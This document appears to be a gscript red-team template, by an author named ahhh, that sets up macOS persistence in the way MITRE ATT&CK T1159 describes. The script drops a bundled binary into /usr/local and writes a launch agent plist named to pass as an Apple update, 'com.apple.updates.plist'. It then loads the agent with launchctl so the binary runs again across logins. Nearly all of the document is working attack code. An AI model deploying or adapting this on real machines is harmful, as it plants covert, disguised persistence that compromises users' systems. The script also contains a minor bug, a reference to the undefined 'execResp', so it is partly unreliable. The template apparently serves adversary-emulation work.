// Example gscript template
// Title: Launch Agent Persistence
// Author: ahhh
// Purpose: Drop a sample binary and a launch agent plist and persist it using Launch Agent
// Gscript version: 1.0.0
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1159

//priority:90
//timeout:150

//go_import:os/user as user

//import:/private/tmp/example.macho
//import:/private/tmp/example_agent.plist

var plist_name = "com.apple.updates.plist";

function Deploy() {
    console.log("starting execution of Launch Agent Persistence");
    // Prep the asset
    var exBin = GetAssetAsBytes("example.macho");
    if (exBin[1] != null) {
        console.log("errors: "+exBin[1].Error());
    }
    // Prep the asset
    var exAgent = GetAssetAsBytes("example_agent.plist");
    if (exAgent[1] != null) {
        console.log("errors: "+exAgent[1].Error());
    }

    // Setup the binary
    name = "/usr/local/agent_example";
    var dropErr = G.file.WriteFileFromBytes(name, exBin[0]);
    if (dropErr != null) {
        console.log("errors: "+dropErr.Error());
    } else {
        console.log("dropped the example binary here: "+name); 
    }
  
    // Setup the launch agent
    var whoami = user.Current();
    var home = whoami[0].HomeDir+"/";
    console.log("home Location: "+ home);    
    var location1 = home + "/Library/LaunchAgents/" + plist_name;
    var location2 = "/System/Library/LaunchAgents/" + plist_name;
    var location3 = "/Library/LaunchAgents/" + plist_name;
    var dropErr2 = G.file.WriteFileFromBytes(location3, exAgent[0]);
    if (dropErr2 != null) {
        console.log("errors: "+dropErr2.Error());
    } else {
        console.log("dropped the agent plist here: "+location3); 
    } 

    // Persist the agent
    exec = G.exec.ExecuteCommand("launchctl", ["load", "-w", location3]);
    if (exec[4] == null) {
        console.log("Persisted binary using launch agent at: "+location3);
        console.log("Pid: "+exec[0]);;
        console.log("stdout: "+exec[1]);
        console.log("stderr: "+exec[2]);
        console.log("exit code: "+exec[3]);
    } else {
        console.log("go errors: "+execResp[4].Error())  ;
    }   

    console.log("done, deployed binary with Launch Agent persistence");
    return true;
}